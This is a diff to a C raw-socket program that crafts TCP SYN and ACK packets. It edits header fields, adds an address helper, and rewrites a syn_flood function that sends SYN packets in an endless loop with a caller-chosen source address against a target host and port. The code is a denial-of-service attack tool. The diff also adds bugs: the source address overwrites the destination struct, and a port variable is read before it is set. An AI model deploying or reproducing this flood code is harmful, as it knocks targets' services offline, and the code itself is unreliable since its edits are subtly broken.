@@ -15,6 +15,19 @@
 #define PACKET_LEN 4096
 #define OPT_SIZE 20
 
+int host_addr(struct sockaddr_in *h_addr, char *addr, int port){
+	struct sockaddr_in host;
+	host.sin_family = AF_INET;
+	host.sin_port = htons(port);
+	if (inet_pton(AF_INET, addr, &host.sin_addr) != 1)
+	{
+		printf("destination IP configuration failed\n");
+		return 1;
+	}
+	*h_addr = host;
+	return 0;
+}
+
 void tcp_syn_packet(struct sockaddr_in* src, struct sockaddr_in* dst, char** packet_ret, int* packet_len){
 
     char *packet = calloc(PACKET_LEN, sizeof(char));
@@ -30,32 +43,32 @@ void tcp_syn_packet(struct sockaddr_in* src, struct sockaddr_in* dst, char** pac
 	//IP Header
 	iph->ihl = 5;
 	iph->version = 4;
-	iph->tos = 16;
+	iph->tos = 0;
 	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + OPT_SIZE;
-	iph->id = htons(54321);
+	iph->id = htonl(rand() % 65535);
 	iph->frag_off = 0;
-	iph->ttl = 255;
+	iph->ttl = 64;
 	iph->protocol = IPPROTO_TCP;
 	iph->check = 0;
 	iph->saddr = src->sin_addr.s_addr;
 	iph->daddr = dst->sin_addr.s_addr;
-	
+
 	//Ip checksum
 	iph->check = csum ((unsigned short *) packet, iph->tot_len);
 	
 	//TCP Header
 	tcph->source = src->sin_port;
 	tcph->dest = dst->sin_port;
-	tcph->th_seq = htonl(0);
+	tcph->th_seq = htonl(rand() % 4294967295);
 	tcph->ack_seq = htonl(0);
-	tcph->doff = 10;
+	tcph->doff = sizeof(struct tcphdr) / 4;
 	tcph->fin=0;
 	tcph->syn=1;
 	tcph->rst=0;
 	tcph->psh=0;
 	tcph->ack=0;
 	tcph->urg=0;
-	tcph->window = htons (5840);
+	tcph->window = htons(5840);
 	tcph->check = 0;
 	tcph->urg_ptr = 0;
 	
@@ -71,7 +84,19 @@ void tcp_syn_packet(struct sockaddr_in* src, struct sockaddr_in* dst, char** pac
 	
 	memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
 	memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + OPT_SIZE);
-	
+/*
+	packet[40] = 0x02;
+	packet[41] = 0x04;
+	int16_t mss = htons(48);
+	memcpy(packet + 42, &mss, sizeof(int16_t));
+	packet[44] = 0x04;
+	packet[45] = 0x02;
+	pseudogram[32] = 0x02;
+	pseudogram[33] = 0x04;
+	memcpy(pseudogram + 34, &mss, sizeof(int16_t));
+	pseudogram[36] = 0x04;
+	pseudogram[37] = 0x02;
+	*/
 	tcph->check = csum( (unsigned short*) pseudogram , psize);
 
     *packet_ret = packet;
@@ -83,14 +108,13 @@ int receive_from(int sock, char* buffer, size_t buffer_length, struct sockaddr_i
 {
 	unsigned short dst_port;
 	int received;
-	do
+	while (dst_port != dst->sin_port)
 	{
-		received = recvfrom(sock, buffer, buffer_length, 0, NULL, NULL);
+		received = recv(sock, buffer, buffer_length, 0);
 		if (received < 0)
 			break;
 		memcpy(&dst_port, buffer + 22, sizeof(dst_port));
 	}
-	while (dst_port != dst->sin_port);
 	printf("received bytes: %d\n", received);
 	printf("destination port: %d\n", ntohs(dst->sin_port));
 	return received;
@@ -113,7 +137,7 @@ void create_ack_packet(struct sockaddr_in* src, struct sockaddr_in* dst, int32_t
 	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + OPT_SIZE;
 	iph->id = htonl(rand() % 65535); // id of this packet
 	iph->frag_off = 0;
-	iph->ttl = 64;
+	iph->ttl = 255;
 	iph->protocol = IPPROTO_TCP;
 	iph->check = 0; // correct calculation follows later
 	iph->saddr = src->sin_addr.s_addr;
@@ -122,9 +146,9 @@ void create_ack_packet(struct sockaddr_in* src, struct sockaddr_in* dst, int32_t
 	// TCP header configuration
 	tcph->source = src->sin_port;
 	tcph->dest = dst->sin_port;
-	tcph->seq = htonl(seq);
-	tcph->ack_seq = htonl(ack_seq);
-	tcph->doff = 10; // tcp header size
+	tcph->seq = htonl(seq + 1);
+	tcph->ack_seq = htonl(ack_seq + 1);
+	tcph->doff = 5; // tcp header size
 	tcph->fin = 0;
 	tcph->syn = 0;
 	tcph->rst = 0;
@@ -167,30 +191,23 @@ void read_seq_and_ack(const char* packet, uint32_t* seq, uint32_t* ack)
 	*seq = ntohl(seq_num);
 	*ack = ntohl(ack_num);
 	printf("sequence number: %lu\n", (unsigned long)*seq);
-	printf("acknowledgement number: %lu\n", (unsigned long)*seq);
+	printf("acknowledgement number: %lu\n", (unsigned long)*ack);
 }
 
 int syn_flood(int sockfd, char *address_dst, char *address_src, int port){
 	while(1){
 		// direccion IP de destino
 		struct sockaddr_in daddr;
-		daddr.sin_family = AF_INET;
-		daddr.sin_port = htons(port);
-		if (inet_pton(AF_INET, address_dst, &daddr.sin_addr) != 1)
-		{
-			printf("destination IP configuration failed\n");
+		if(host_addr(&daddr, address_dst, port) == 1){
 			return 1;
 		}
 
 		// direccion IP de origen
 		struct sockaddr_in saddr;
-		saddr.sin_family = AF_INET;
-		saddr.sin_port = htons(rand() % 65536); // random client port
-		if (inet_pton(AF_INET, address_src, &saddr.sin_addr) != 1)
-		{
-			printf("source IP configuration failed\n");
+		if(host_addr(&daddr, address_src, rand() % 65536) == 1){
 			return 1;
 		}
+
 		char* packet;
 		int packet_len;
 		tcp_syn_packet(&saddr, &daddr, &packet, &packet_len);
